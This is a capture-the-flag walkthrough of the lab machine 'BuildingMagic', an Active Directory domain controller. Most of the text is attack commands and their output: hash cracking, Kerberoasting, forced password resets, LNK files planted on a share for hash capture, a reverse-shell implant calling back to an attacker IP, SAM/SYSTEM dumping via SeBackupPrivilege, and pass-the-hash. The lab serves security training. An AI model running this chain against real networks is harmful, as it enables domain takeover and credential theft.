## **Machine Walkthrough**

 #HackSmarter #BuildingMagic #Machine_Walkthrough #Rooted

* * *

<br>

# BuildingMagic Machine Walkthrough

## Information Provided

### Leaked Database

We were given a _Leaked Database File_ that contained usernames, full names, roles and hashed passwords.

```bash
id	username	full_name	role		password
1	r.widdleton	Ron Widdleton	Intern Builder	c4a21c4d438819d73d24851e7966229c
2	n.bottomsworth	Neville Bottomsworth Plannner	61ee643c5043eadbcdc6c9d1e3ebd298
3	l.layman	Luna Layman	Planner		8960516f904051176cc5ef67869de88f
4	c.smith		Chen Smith	Builder		bbd151e24516a48790b2cd5845e7f148
5	d.thomas	Dean Thomas	Builder		4d14ff3e264f6a9891aa6cea1cfa17cb
6	s.winnigan	Samuel Winnigan	HR Manager	078576a0569f4e0b758aedf650cb6d9a
7	p.jackson	Parvati Jackson	Shift Lead	eada74b2fa7f5e142ac412d767831b54
8	b.builder	Bob Builder	Electrician	dd4137bab3b52b55f99f18b7cd595448
9	t.ren		Theodore Ren	Safety Officer	bfaf794a81438488e57ee3954c27cd75
10	e.macmillan	Ernest Macmillan Surveyor	47d23284395f618bea1959e710bc68ef

```

#### **<br>
**

#### **Formatted Data**

Lets format the data to a more usable state.

```bash
cat leaked_database | awk '{print $NF}' | tail > formatted_database

```

<br>

```bash
c4a21c4d438819d73d24851e7966229c
61ee643c5043eadbcdc6c9d1e3ebd298
8960516f904051176cc5ef67869de88f
bbd151e24516a48790b2cd5845e7f148
4d14ff3e264f6a9891aa6cea1cfa17cb
078576a0569f4e0b758aedf650cb6d9a
eada74b2fa7f5e142ac412d767831b54
dd4137bab3b52b55f99f18b7cd595448
bfaf794a81438488e57ee3954c27cd75
47d23284395f618bea1959e710bc68ef

```

#### **<br>
**

#### **Identify Hashes**

Now lets identify the types of hashes.

```bash
hashcat --identify formatted_database

```

<br>

```bash
      # | Name                                                       | Category
  ======+============================================================+======================================
    900 | MD4                                                        | Raw Hash
      0 | MD5                                                        | Raw Hash
     70 | md5(utf16le($pass))                                        | Raw Hash
   2600 | md5(md5($pass))                                            | Raw Hash salted and/or iterated
   3500 | md5(md5(md5($pass)))                                       | Raw Hash salted and/or iterated
   4400 | md5(sha1($pass))                                           | Raw Hash salted and/or iterated
  20900 | md5(sha1($pass).md5($pass).sha1($pass))                    | Raw Hash salted and/or iterated
  32800 | md5(sha1(md5($pass)))                                      | Raw Hash salted and/or iterated
   4300 | md5(strtoupper(md5($pass)))                                | Raw Hash salted and/or iterated
   1000 | NTLM                                                       | Operating System
   9900 | Radmin2                                                    | Operating System
   8600 | Lotus Notes/Domino 5                                       | Enterprise Application Software (EAS)


```

<br>

Looks like MD5 hashes so we will use `-m 0` to crack them.

```bash
hashcat -m 0 -a 0 formatted_database /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best66.rule

```

<br>

> Cracked 1 Hash

<br>

```bash
hashcat -m 0 formatted_database --show

```

<br>

```bash
c4a21c4d438819d73d24851e7966229c:lilronron

```

<br>

Looking at the original table that has and password belongs to _r.widdleton_

```bash
cat cracked_passwords

```

<br>

```bash
r.widdleton:lilronron

```

<br>

**We also want to add all the usernames to a username file in case there is password reuse or we come across other passwords in the future.**

```bash
awk 'NR>1 {print $2}' leaked_database > usernames
# awk - text processing tool that processes input line by line
# 'NR>1 - only process lines where record number is greater than 1 (skips header)
# {print $2}' - print the 2nd field/column (username)
# leaked_database - the input file

```

<br>

```bash
r.widdleton
n.bottomsworth
l.layman
c.smith
d.thomas
s.winnigan
p.jackson
b.builder
t.ren
e.macmillan

```

<br>

Now we need to make a password file:

```bash
echo -n 'lilronron' > passwords

```

<br>

```bash
lilronron

```

* * *

<br>

## Domain Names

- We were also provided 2 domains to add to our /etc/hosts file
    - `buildingmagic.local`
    - `dc01.buildingmagic.local`

```bash
# Added to /etc/hosts
10.0.19.89       dc01.buildingmagic.local buildingmagic.local

```

* * *

## Initial Enumeration

### Maelstrom

This is a windows lab so I will start with my maelstrom tool for initial enumeration.

> Tool: [Maelstrom](https://github.com/Real-Fruit-Snacks/Maelstrom)

```bash
maelstrom 10.0.19.89 -C cracked_passwords -A -o initial_enumeration.txt

```

<br>

```bash
# Credential Validation for 10.0.19.89
[+] NULL SESSION: valid
[+] r.widdleton: valid

# Target is a Domain Controller
  Hostname:        DC01
  FQDN:            DC01.BUILDINGMAGIC.LOCAL
  NetBIOS Domain:  BUILDINGMAGIC
  DNS Domain:      BUILDINGMAGIC.LOCAL
  Domain SID:      S-1-5-21-934388623-3731635803-3176817623

# Server allows authentication via username '' and password ''

# Found OS information via SMB
  OS: Windows Server 2022 Build 20348 x64
  OS version: '2022'
  Architecture: x64
  OS build: '20348'

# Users with Descriptions 
1115    a.flatch                Project Manager

# ACCESSIBLE SHARES (1)
Share           Access       Comment
--------------- ------------ ------------------------------
IPC$            READ         Remote IPC

# Domain password information:
  Password history length: 24
  Minimum password length: 1 ← Weak!
  Minimum password age: None
  Maximum password age: 268 days 23 hours 59 minutes
  Password properties:
  - DOMAIN_PASSWORD_COMPLEX: 000000

# Domain lockout information:
  Lockout observation window: 30 minutes
  Lockout duration: 30 minutes
  Lockout threshold: None

# Kerberoastable Accounts for 10.0.19.89 (as r.widdleton)    
  >>> r.haggard <<<
      SPN: HOGWARTS-DC/r.hagrid.WIZARDING.THM:60111

# RDP CONFIGURATION
--------------------------------------------------
  [+] RDP: Enabled
  [*] Hostname: DC01
  [+] NLA: Required
      Network Level Authentication protects against some attacks

# Found 4 account(s) with adminCount=1:

    Administrator
    krbtgt
    h.grangon
    a.flatch



```

<br>

> Kerberoastable Accounts for 10.0.19.89 (as r.widdleton) r.haggard - SPN: `HOGWARTS-DC/r.hagrid.WIZARDING.THM:60111` 

* * *

<br>

## Kerberoast

### Get the Hash

```bash
nxc ldap 10.0.19.89 -u 'r.widdleton' -p 'lilronron' -d 'BUILDINGMAGIC.LOCAL' --kerberoasting hashes.txt

```

<br>

```bash
$krb5tgs$23$*r.haggard$BUILDINGMAGIC.LOCAL$BUILDINGMAGIC.LOCAL\r.haggard*$e692c6ca7a242dac47d34fda83d7b724$6c5cebd6e9e59500698c1640d14f6aa9ea1aa47062563b6697584b4f3b5a6ce7ce398eb580e42e2982f11138209a2f7e88c9811b15f28c87a23344f42b5e00ba686f21021c21765074737b1127dd2c15114f6b8b9d95c6b998b9f9a4dff0b149530c1fbfdaa0c3c567b0d326d38dc61014a7d208bd354740038036148ad2aa40cd7348e56e101364c4974df59fe018798978b83be41a3eca1af89b9b5fb86040174c9c4339c9af554a5369b7d63df50c63bb92ee999fe3214b1493d1285363b31e3943db3aefc655304f43aed47af35d465dd87c75955ffd1a7748350c8f1e49347ed3209da2543f3c9f9bb20df0291a16b0b422c4a3364f79bc85726423d96fa5a8c51c0e05e6414ac3288ba5e121a665f10902248392c0933f15091fe0e004b012bfe5690225cebede75edc063e78ad6842093f979c57cf71c21ecaa41fcdd9bdb83bdf780daa7f1df11749eeca597a83ab2bcfd04bc6605a5a05fc06d299e6e34f456906369b38cd816fd8b61d47e445c540c6aa4d9fa0a43aa13e0fc75f6f0d2e71979dba1f12c9805dc60da6cc817149de4b663c636cec09b6264aa08949ade2cf01f621d3baf551f67f29db767ec92b5a4d40d218960660503e8d41b642302f0f47c8f2f7ce098bcab3a1dbfb66c0297eec9b33f1404474e36338e5ab54e6826563401667105ae9330d684f1351bcd4eaa9aba22e443b8d90da877ec03d5d97669e5d19563a8466cac435fc168617e7ca5e28b82435214c32a5c8210d190035e45aa5a5ab0a834f987e321787df33c11f865fc26e608c3c93a14fa307688ec26f8e941a7d6a9062dbc8ce8843652d4a7e20da8d34f44c1d2d6f86cc35b673ce72629fbbe87fcc3752ee8c7ded4bce2ae85ddebec253ff1124ecf0f794604387c4f97bae82f13bc612874b0b1a95fffb469384d0d86aa01086cae3e5b0a1e0c39f31177b8332e76e1979cf38e03a4cbcd266c1705d45fed6882fa7eb56f6cacea5d8c6cba0ec2d0e4c6ca823197bf8b461aa8278b00adfff3322364b47f709f72f532fc70469cbdf0ae30e496f3c4d096ebb3e5b79e3621c069728e1086a859779c8e9be3436f3e6511ce05423a3af5a018d7de124778ccfbe5bd8de0478870cd362bb4cbb94f06c5319c349509556fbbde58acfa5835f5f9576a4e34e24676f68f831b8f2dadd8f5a31bdb7f559d99fba8bad25db04c4abc119a6e8de4e67a0c53e3cb993258c4833ea64787206d8ae60fea861deb63923b826f2f8e7f7d17b3dbe314c8d4083c9fd6eb2605c6d8d96be9852f8c0a4db114f51735ee6373a8166b516250857ba15bffb7bd69b6bd898b6e13aa62bc4526e4e3a7023bf89110d795e8f6a1a320b03e9efc5830902ef0e53a694ba17b0aa1d122fc0ae5c056f33cdaa8d418e4bc7f9e9ab8cdc49dff013144f41efb06e3058824c20eb223bfc38aa4982df91de609f97de0a416046f4441370eb10b3c5f5dc0959d9cde0de026a1c18b1f2ce6fc1adb7fcf3092ef183f402909c8dbd168d15626bd214d3f35fa4a0c727969324d4ee322806772

```

### <br>

### Crack the Hash

```bash
hashcat -m 13100 hashes.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best66.rule

```

<br>

> Cracked Hash for `r.haggard` from _Kerberoast_ `rubeushagrid`

<br>

Add the new username and password to the cracked passwords file (this is the one that has both username:password) and the passwords file (this is the one we can use to password spray)

```bash
cat cracked_passwords

```

<br>

```bash
r.widdleton:lilronron
r.haggard:rubeushagrid

```

* * *

<br>

## Enumerate with New User `r.haggard`

### Maelstrom

> Tool: [Maelstrom](https://github.com/Real-Fruit-Snacks/Maelstrom)

Now that we have a new username and password combination we will run maelstrom again, this time with the new creds.

```bash
maelstrom 10.0.19.89 -u r.haggard -p 'rubeushagrid' -A -o r.haggard_enumeration.txt

```

<br>

No need to put down what we learned from our first scan, so here is the information we learned from using `r.haggard`

```bash
# He has access to more shares
# ACCESSIBLE SHARES (3)
Share           Access       Comment
--------------- ------------ ------------------------------
IPC$            READ         Remote IPC
NETLOGON        READ         Logon server share
SYSVOL          READ         Logon server share

# We can spider these shares 
nxc smb 10.0.19.89 -u 'r.haggard' -p 'rubeushagrid' -d 'BUILDINGMAGIC.LOCAL' -M spider_plus -o OUTPUT_FOLDER=. MAX_FILE_SIZE=10485760 DOWNLOAD_FLAG=True

```

* * *

<br>

## Spidering Shares

```bash
nxc smb 10.0.19.89 -u 'r.haggard' -p 'rubeushagrid' -d 'BUILDINGMAGIC.LOCAL' -M spider_plus -o OUTPUT_FOLDER=. MAX_FILE_SIZE=1000485760 DOWNLOAD_FLAG=True

```

<br>

> Nothing of interest was found in the output

## Further Enumeration (Active Directory) Tool Installation

We need to enumerate the active directory network further. We will run RustHound-CE and then analyze the results using runoff, but runoff will require bloodhound-CE running.

### Install Bloodhound-CE

> Tool: [Bloodhound-CE](https://bloodhound.specterops.io/get-started/quickstart/community-edition-quickstart)

<br>

```bash
wget https://github.com/SpecterOps/bloodhound-cli/releases/latest/download/bloodhound-cli-linux-amd64.tar.gz

```

<br>

```bash
tar -xvzf bloodhound-cli-linux-amd64.tar.gz

```

<br>

```bash
./bloodhound-cli install

```

<br>

```bash
# Output
[+] BloodHound is ready to go!
[+] You can log in as `admin` with this password: uHf8oMW1bXWF3U5DEulCJne9cugnPHDZ
[+] You can get your admin password by running: bloodhound-cli config get default_password
[+] You can access the BloodHound UI at: http://127.0.0.1:8080/ui/login

```

### <br>

### Install Runoff

> Tool: [Runoff](https://github.com/Real-Fruit-Snacks/Runoff)

```bash
pipx install git+https://github.com/Real-Fruit-Snacks/Runoff.git

```

### <br>

### Install RustHound-CE

> Tool: [RustHound-CE](https://github.com/g0h4n/RustHound-CE)

<br>

```bash
# Install and/or update RustHound-CE from cargo command
cargo install rusthound-ce

```

* * *

<br>

## Further Enumeration (Active Directory)

### RustHound-CE

```bash
rusthound-ce -d buildingmagic.local -u r.widdleton@buildingmagic.local -p 'lilronron' -i 10.0.19.89 -z -o .

```

<br>

```bash
[2026-04-13T00:03:50Z INFO  rusthound_ce::json::maker::common] 9 users parsed!
[2026-04-13T00:03:50Z INFO  rusthound_ce::json::maker::common] 60 groups parsed!
[2026-04-13T00:03:50Z INFO  rusthound_ce::json::maker::common] 1 computers parsed!
[2026-04-13T00:03:50Z INFO  rusthound_ce::json::maker::common] 2 ous parsed!
[2026-04-13T00:03:50Z INFO  rusthound_ce::json::maker::common] 1 domains parsed!
[2026-04-13T00:03:50Z INFO  rusthound_ce::json::maker::common] 3 gpos parsed!
[2026-04-13T00:03:50Z INFO  rusthound_ce::json::maker::common] 73 containers parsed!
[2026-04-13T00:03:50Z INFO  rusthound_ce::json::maker::common] ./20260412200350_buildingmagic-local_rusthound-ce.zip created!

```

<br>

Now we need to import that zip into BloodHound-CE

```bash
firefox http://127.0.0.1:8080/ui/login

```

Now that the files have been ingested by BloodHound-CE we will use Runoff to see our attack paths.

### <br>

### Runoff

We need to mark accounts we _own_ so bloodhound can give us proper information

```bash
runoff -p 'bloodhoundcommunityedition' mark owned 'r.widdleton@buildingmagic.local'

```

<br>

```bash
runoff -p 'bloodhoundcommunityedition' mark owned 'r.haggard@buildingmagic.local'

```

<br>

Now lets run all queries with the quiet options so we don't have to sift through empty output and the abuse flag will give us the commands to take advantage of anything found.

```bash
runoff -p 'bloodhoundcommunityedition' -q --abuse run all

```

#### <br>

#### Information Gathered from Runoff

> _r.haggard_ can force change the password of `h.potch`

##### <br>

##### Force password change (bloodyAD)

```bash
# I need to install this tool to use it
pipx install bloodyad

```

<br>

```bash
bloodyAD -d BUILDINGMAGIC.LOCAL -u r.haggard -p 'rubeushagrid' --host 10.0.19.89 set password H.POTCH 'Passw0rd!2025'

```

<br>

```bash
[+] Password changed successfully!

```

<br>

> Password was sucessfully changed for `h.potch` to `Passw0rd!2025`

<br>

Lets add this information to the cracked password file and the password file. We will also mark this user as owned and rerun the Runoff tool.

```bash
runoff -p 'bloodhoundcommunityedition' mark owned 'h.potch@buildingmagic.local'

```

<br>

```bash
runoff -p 'bloodhoundcommunityedition' -q --abuse run all

```

<br>

> No new information was gathered

* * *

<br>

## Enumerate with New User `h.potch`

### Maelstrom

> Tool: [Maelstrom](https://github.com/Real-Fruit-Snacks/Maelstrom)

Now that we have a new username and password combination we will run maelstrom again, this time with the new creds.

<br>

```bash
maelstrom 10.0.19.89 -u h.potch -p 'Passw0rd!2025' -A -o h.potch_enumeration.txt

```

<br>

No need to put down what we learned from our first scan, so here is the information we learned from using `h.potch`.

```bash
# ACCESSIBLE SHARES (4)
Share           Access       Comment
--------------- ------------ ------------------------------
File-Share      READ,WRITE   Central Repository of Build...
IPC$            READ         Remote IPC
NETLOGON        READ         Logon server share
SYSVOL          READ         Logon server share

```

<br>

We now have the ability to read and write to the _File-Share_. Lets see if we can find any more information from it.

```bash
smbclient //'10.0.19.89'/'File-Share' -U 'h.potch%Passw0rd!2025' -W 'BUILDINGMAGIC.LOCAL'

```

<br>

> File-Share is empty. Maybe able to upload file to capture hashes.

* * *

<br>

## Responder in the _File-Share_

Lets setup Responder

```bash
responder -I tun0 -wv

```

<br>

Using nxc to upload malicious file.

> Writing LNK files into writable SMB shares with Netexec

<br>

```bash
nxc smb buildingmagic.local -u h.potch -p 'Passw0rd!2025' -M slinky -o SERVER=10.200.46.199 SHARES=File-Share NAME=steal

```

<br>

```bash
SMB         10.0.19.89      445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:BUILDINGMAGIC.LOCAL) (signing:True) (SMBv1:None) (Null Auth:True)                                                   
SMB         10.0.19.89      445    DC01             [+] BUILDINGMAGIC.LOCAL\h.potch:Passw0rd!2025
SMB         10.0.19.89      445    DC01             [*] Enumerated shares
SMB         10.0.19.89      445    DC01             Share           Permissions     Remark                                                              
SMB         10.0.19.89      445    DC01             -----           -----------     ------                                                              
SMB         10.0.19.89      445    DC01             ADMIN$                          Remote Admin                                                        
SMB         10.0.19.89      445    DC01             C$                              Default share                                                       
SMB         10.0.19.89      445    DC01             File-Share      READ,WRITE      Central Repository of Building Magic's files.                       
SMB         10.0.19.89      445    DC01             IPC$            READ            Remote IPC                                                          
SMB         10.0.19.89      445    DC01             NETLOGON        READ            Logon server share                                                  
SMB         10.0.19.89      445    DC01             SYSVOL          READ            Logon server share                                                  
SLINKY      10.0.19.89      445    DC01             [+] Found writable share: File-Share
SLINKY      10.0.19.89      445    DC01             [+] Created LNK file on the File-Share share

```

<br>

> File uploaded successfully.

<br>

> Had to reset machine because I was getting no callback. /etc/hosts has been updated with the new target IP: `10.1.24.137`

<br>

Need to reset _h.potch_ password again with this new machine.

<br>

```bash
bloodyAD -d BUILDINGMAGIC.LOCAL -u r.haggard -p 'rubeushagrid' --host 10.1.24.137 set password H.POTCH 'Passw0rd!2025'

```

<br>

```bash
[+] Password changed successfully!

```

<br>

Now lets reupload the malicious file after restarting our Responder...

```bash
responder -I tun0

```

<br>

```bash
nxc smb buildingmagic.local -u h.potch -p 'Passw0rd!2025' -M slinky -o SERVER=10.200.46.199 SHARES=File-Share NAME=giveme

```

<br>

> File Uploaded.

<br>

> Back to what we were doing...

<br>

> Nothing ever calls back.... so we will use the password from the video for user `h.grangon`

<br>

```bash
# hashcat -m 5600 captured.txt /usr/share/wordlists/rockyou.txt -r 
/usr/share/hashcat/rules/best66.rule

```

<br>

```bash
magic4ever

```

#### <br>

#### Information Gathered from Responder/Hashcat

> `h.grangon` hash was cracked.
> 
> - `magic4ever`

Lets add this information to the cracked password file and the password file. We will also mark this user as owned and rerun the Runoff tool.

<br>

```bash
runoff -p 'bloodhoundcommunityedition' mark owned 'h.grangon@buildingmagic.local'

```

<br>

```bash
runoff -p 'bloodhoundcommunityedition' investigate 'h.grangon@buildingmagic.local'

```

<br>

> This user is a member of the `Remote Management Group` This allows access to WMI resources

* * *

<br>

## Rapids Password Spraying

> Tool: [Rapids](https://github.com/Real-Fruit-Snacks/Rapids)

<br>

```bash
pipx install git+https://github.com/Real-Fruit-Snacks/Rapids.git

```

<br>

Now that the tool is installed lets test it out.

```bash
rapids -t 10.1.24.137 -u h.grangon -p 'magic4ever' --verify

```

<br>

```bash
                                                                     Valid Credentials                                                                      
┏━━━━━━━━━━━━┳━━━━━━━━━━━━━━━━━━┳━━━━━━━━━━━┳━━━━━━━━━━━━┳━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
┃ Service    ┃ Target           ┃ Username  ┃ Password   ┃ Proof                                                                                           ┃
┡━━━━━━━━━━━━╇━━━━━━━━━━━━━━━━━━╇━━━━━━━━━━━╇━━━━━━━━━━━━╇━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┩
│ evil-winrm │ 10.1.24.137:5985 │ h.grangon │ magic4ever │ buildingmagic\h.grangon | DC01                                                                  │
│ kerberos   │ 10.1.24.137:88   │           │            │ TGT obtained for h.grangon@BUILDINGMAGIC.LOCAL                                                  │
│ ldap       │ 10.1.24.137:389  │           │            │ namingContexts=['DC=BUILDINGMAGIC,DC=LOCAL', 'CN=Configuration,DC=BUILDINGMAGIC,DC=LOCAL',      │
│            │                  │           │            │ 'CN=Schema,CN=Configuration,DC=BUILDINGMAGIC,DC=LOCAL',                                         │
│            │                  │           │            │ 'DC=DomainDnsZones,DC=BUILDINGMAGIC,DC=LOCAL', 'DC=ForestDnsZones,DC=BUILDINGMAGIC,DC=LOCAL']   │
│ smb        │ 10.1.24.137:445  │           │            │ Shares: ADMIN$, C$, File-Share, IPC$, NETLOGON, SYSVOL                                          │
│ wmi        │ 10.1.24.137:135  │           │            │ BUILDINGMAGIC.LOCAL\h.grangon:magic4ever                                                        │
└────────────┴──────────────────┴───────────┴────────────┴─────────────────────────────────────────────────────────────────────────────────────────────────┘

  1 unique credential(s) across 5 service(s).


```

<br>

With that information, lets test out our evil-winrm credentials.

* * *

<br>

## Evil-Winrm Access (Post Exploitation)

```bash
evil-winrm -u 'h.grangon' -p 'magic4ever' -i dc01.buildingmagic.local

```

<br>

> Access was granted.

Navigating the to the users Desktop we found the `user.txt` flag.

<br>

```bash
701b51527b6d4105d9b16b412af2d604

```

<br>

I want to test out my other tool so lets upload Vapor and get a callback.

> Tool: [Vapor](https://github.com/Real-Fruit-Snacks/Vapor.git)

<br>

```bash
cd /opt
git clone https://github.com/Real-Fruit-Snacks/Vapor.git
cd Vapor

```

<br>

```bash
./build.sh 10.200.46.199 443

```

<br>

```bash
python listener.py --lport 443 --key cef244d38f9db097ac67415f833fccaf4dcb602b0fcb40c602be4e0ebcb808d6

```

<br>

> From Evil-Winrm upload Vapor.exe

<br>

```bash
upload /opt/Vapor/vapor.exe

```

<br>

```bash
.\Vapor.exe

```

<br>

> Got Callback

<br>

Now lets check for what privs we have.

```bash
whoami /priv
[+] Result:                             

PRIVILEGES INFORMATION                                                      
----------------------                                                      
                                                                            
Privilege Name                Description                    State          
============================= ============================== =======        
SeMachineAccountPrivilege     Add workstations to domain     Enabled        
SeBackupPrivilege             Back up files and directories  Enabled        
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled        
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled

```

<br>

> `SeBackupPrivilege` is enabled!

<br>

This will allow up to backup files we normally wouldn't have access todo so.

### Saving the SAM and SYSTEM File

```bash
reg save HKLM\SAM SAM

```

<br>

```bash
reg save HKLM\SYSTEM SYSTEM

```

<br>

From our evil-winrm session we will download the SAM file.

<br>

```bash
download SAM
download SYSTEM

```

* * *

<br>

## Impacket-SecretsDump

Using our downloaded files, lets extract the secrets

```bash
impacket-secretsdump -sam SAM -system SYSTEM local

```

<br>

```bash
[*] Target system bootKey: 0xf61a94fb13f74350a1f87f509c8c455c
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:520126a03f5d5a8d836f1c4f34ede7ce:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[*] Cleaning up... 

```

<br>

> Got the `Administrator` Hash

* * *

<br>

## Pass the Hash Check with Rapids

```bash
rapids -u Administrator -p ':520126a03f5d5a8d836f1c4f34ede7ce' -t 10.1.24.137 --verify

```

<br>

> All tests failed. Must be disabled lets test it against other users to see if there is any password reuse.

<br>

```bash
rapids -U usernames -p ':520126a03f5d5a8d836f1c4f34ede7ce' -t 10.1.24.137 --verify

```

<br>

```bash
                                                                     Valid Credentials                                                                      
┏━━━━━━━━━━━━┳━━━━━━━━━━━━━━━━━━┳━━━━━━━━━━┳━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┳━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
┃ Service    ┃ Target           ┃ Username ┃ Password                         ┃ Proof                                                                      ┃
┡━━━━━━━━━━━━╇━━━━━━━━━━━━━━━━━━╇━━━━━━━━━━╇━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╇━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┩
│ evil-winrm │ 10.1.24.137:5985 │ a.flatch │ 520126a03f5d5a8d836f1c4f34ede7ce │ buildingmagic\a.flatch | DC01                                              │
│ kerberos   │ 10.1.24.137:88   │          │                                  │ TGT obtained for a.flatch@BUILDINGMAGIC.LOCAL                              │
│ ldap       │ 10.1.24.137:389  │          │                                  │ namingContexts=['DC=BUILDINGMAGIC,DC=LOCAL',                               │
│            │                  │          │                                  │ 'CN=Configuration,DC=BUILDINGMAGIC,DC=LOCAL',                              │
│            │                  │          │                                  │ 'CN=Schema,CN=Configuration,DC=BUILDINGMAGIC,DC=LOCAL',                    │
│            │                  │          │                                  │ 'DC=DomainDnsZones,DC=BUILDINGMAGIC,DC=LOCAL',                             │
│            │                  │          │                                  │ 'DC=ForestDnsZones,DC=BUILDINGMAGIC,DC=LOCAL']                             │
│ smb        │ 10.1.24.137:445  │          │                                  │ Shares: ADMIN$, C$, File-Share, IPC$, NETLOGON, SYSVOL                     │
│ wmi        │ 10.1.24.137:135  │          │                                  │ BUILDINGMAGIC.LOCAL\a.flatch:520126a03f5d5a8d836f1c4f34ede7ce (Pwn3d!)     │
└────────────┴──────────────────┴──────────┴──────────────────────────────────┴────────────────────────────────────────────────────────────────────────────┘

  1 unique credential(s) across 5 service(s).

```

* * *

<br>

## Evil-winrm as `a.flatch`

```bash
evil-winrm -u 'a.flatch' -H '520126a03f5d5a8d836f1c4f34ede7ce' -i dc01.buildingmagic.local

```

<br>

```bash
whoami

```

<br>

```bash
buildingmagic\a.flatch

```

<br>

Lets get the Root (Administrator) flag.

```bash
cd C:\Users\Administrator\Desktop

```

<br>

```bash
download root.txt

```

<br>

> Downloaded the root.txt!

<br>

```bash
cat root.txt         
9557e65743416cfadadfb17f89b8651b

```

<br>

> All flags have been acquired.